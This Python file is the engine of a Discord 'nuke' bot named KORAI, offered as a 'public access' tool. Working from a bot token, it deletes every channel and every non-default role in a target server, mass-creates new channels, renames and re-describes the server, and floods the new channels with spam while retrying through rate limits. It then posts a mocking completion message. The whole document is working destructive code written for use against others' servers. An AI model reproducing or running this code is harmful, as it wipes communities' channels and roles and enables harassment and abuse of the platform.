"""
KORAI Nuke Engine
Made by laxzytbh
MAXIMUM VELOCITY - PUBLIC ACCESS VERSION
"""

import asyncio
import random
import time
from datetime import datetime, timezone

import discord
import aiohttp


class NukeEngine:
    def __init__(self, bot, config, queue, rate_handler, logger):
        self.bot = bot
        self.config = config
        self.queue = queue
        self.rate = rate_handler
        self.log = logger
        self.guild = None
        self.session = None
        self.stats = {
            "deleted_channels": 0,
            "deleted_roles": 0,
            "created_channels": [],
            "messages_sent": 0,
            "failed_sends": 0,
            "start_time": None,
            "end_time": None
        }
        self.channel_cooldowns = {}
    
    async def execute(self, guild: discord.Guild, ctx):
        """Execute full nuke sequence - PUBLIC ACCESS"""
        self.guild = guild
        self.stats["start_time"] = datetime.now(timezone.utc)
        self.session = aiohttp.ClientSession()
        
        await ctx.send("starting nuke...")
        self.log.info(f"Target: {guild.name} | Nuker: {ctx.author}")
        
        try:
            await self._phase_destroy()
            await self._phase_create()
            await self._phase_takeover()
            await self._phase_spam_fast()
        except Exception as e:
            self.log.error(f"Nuke error: {e}")
        finally:
            self.stats["end_time"] = datetime.now(timezone.utc)
            await self.session.close()
            await self._send_completion(ctx)
    
    async def _phase_destroy(self):
        self.log.info("[PHASE 1] DESTRUCTION")
        
        channels = list(self.guild.channels)
        roles = [r for r in self.guild.roles if r != self.guild.default_role]
        
        tasks = [self._delete_channel_fast(ch.id) for ch in channels]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        self.stats["deleted_channels"] = sum(1 for r in results if r in (200, 204, 404))
        
        tasks = [self._delete_role_fast(ro.id) for ro in roles]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        self.stats["deleted_roles"] = sum(1 for r in results if r in (200, 204, 404))
        
        self.log.info(f"Destroyed: {self.stats['deleted_channels']}ch | {self.stats['deleted_roles']}ro")
    
    async def _delete_channel_fast(self, channel_id):
        headers = {"Authorization": f"Bot {self.bot.http.token}"}
        url = f"https://discord.com/api/v10/channels/{channel_id}"
        try:
            async with self.session.delete(url, headers=headers) as resp:
                return resp.status
        except:
            return 0
    
    async def _delete_role_fast(self, role_id):
        headers = {"Authorization": f"Bot {self.bot.http.token}"}
        url = f"https://discord.com/api/v10/guilds/{self.guild.id}/roles/{role_id}"
        try:
            async with self.session.delete(url, headers=headers) as resp:
                return resp.status
        except:
            return 0
    
    async def _phase_create(self):
        self.log.info("[PHASE 2] CREATION")
        
        count = self.config["nuke"]["channel_count"]
        names = self.config["nuke"]["channel_names"]
        
        tasks = []
        for i in range(count):
            name = random.choice(names)
            suffix = f"-{i}" if i > 0 else ""
            full_name = f"{name}{suffix}"[:100]
            tasks.append(self._create_channel_fast(full_name))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        self.stats["created_channels"] = [r for r in results if isinstance(r, str)]
        
        self.log.info(f"Created: {len(self.stats['created_channels'])}/{count}")
        
        if self.stats["created_channels"]:
            await asyncio.sleep(0.5)
    
    async def _create_channel_fast(self, name):
        headers = {
            "Authorization": f"Bot {self.bot.http.token}",
            "Content-Type": "application/json"
        }
        url = f"https://discord.com/api/v10/guilds/{self.guild.id}/channels"
        try:
            async with self.session.post(url, headers=headers, json={"name": name, "type": 0}) as resp:
                if resp.status == 201:
                    data = await resp.json()
                    return data.get("id")
                return None
        except:
            return None
    
    async def _phase_takeover(self):
        self.log.info("[PHASE 3] TAKEOVER")
        
        headers = {
            "Authorization": f"Bot {self.bot.http.token}",
            "Content-Type": "application/json"
        }
        url = f"https://discord.com/api/v10/guilds/{self.guild.id}"
        
        try:
            async with self.session.patch(url, headers=headers, json={
                "name": self.config["nuke"]["server_name"],
                "description": self.config["nuke"]["server_description"]
            }) as resp:
                if resp.status == 200:
                    self.log.info("Server info changed")
        except:
            pass
    
    async def _phase_spam_fast(self):
        channel_ids = self.stats["created_channels"]
        if not channel_ids:
            return
        
        msg_count = self.config["nuke"]["message_count"]
        total = len(channel_ids) * msg_count
        
        self.log.info(f"[PHASE 4] SPAM | {len(channel_ids)} channels × {msg_count} = {total}")
        
        completed = 0
        failed = 0
        
        headers = {
            "Authorization": f"Bot {self.bot.http.token}",
            "Content-Type": "application/json"
        }
        
        # Burst mode
        burst = 5
        for _ in range(burst):
            tasks = []
            for ch_id in channel_ids:
                url = f"https://discord.com/api/v10/channels/{ch_id}/messages"
                tasks.append(self._send_once(url, headers, self.config["nuke"]["webhook_message"]))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for s in results:
                if s == 200: completed += 1
                else: failed += 1
        
        # Steady mode
        remaining = msg_count - burst
        for i in range(remaining):
            tasks = []
            for ch_id in channel_ids:
                url = f"https://discord.com/api/v10/channels/{ch_id}/messages"
                tasks.append(self._send_once(url, headers, self.config["nuke"]["webhook_message"]))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for s in results:
                if s == 200: completed += 1
                else: failed += 1
            
            if i % 20 == 0:
                self.log.info(f"Progress: {completed}/{total}")
            await asyncio.sleep(0.02)
        
        self.stats["messages_sent"] = completed
        self.stats["failed_sends"] = failed
        self.log.info(f"Complete: {completed} sent, {failed} failed")
    
    async def _send_once(self, url, headers, content):
        try:
            async with self.session.post(url, headers=headers, json={"content": content}) as resp:
                if resp.status == 429:
                    retry = float(resp.headers.get("Retry-After", 0.05))
                    await asyncio.sleep(retry)
                    async with self.session.post(url, headers=headers, json={"content": content}) as resp2:
                        return resp2.status
                return resp.status
        except:
            return 0
    
    async def _send_completion(self, ctx):
        duration = (self.stats["end_time"] - self.stats["start_time"]).total_seconds()
        
        embed = discord.Embed(
            title="KORAI NUKE COMPLETE",
            description="nice server you got there bud",
            color=0xff0000,
            timestamp=self.stats["end_time"]
        )
        
        embed.add_field(name="Duration", value=f"{duration:.2f}s", inline=True)
        embed.add_field(name="Channels", value=f"{self.stats['deleted_channels']}->{len(self.stats['created_channels'])}", inline=True)
        embed.add_field(name="Messages", value=str(self.stats['messages_sent']), inline=True)
        
        if self.stats["failed_sends"] > 0:
            embed.add_field(name="Failed", value=str(self.stats['failed_sends']), inline=True)
        
        embed.set_footer(text="KORAI | Made by laxzytbh")
        
        try:
            await ctx.send(embed=embed)
        except:
            pass
        
        self.log.success(f"Complete in {duration:.2f}s")
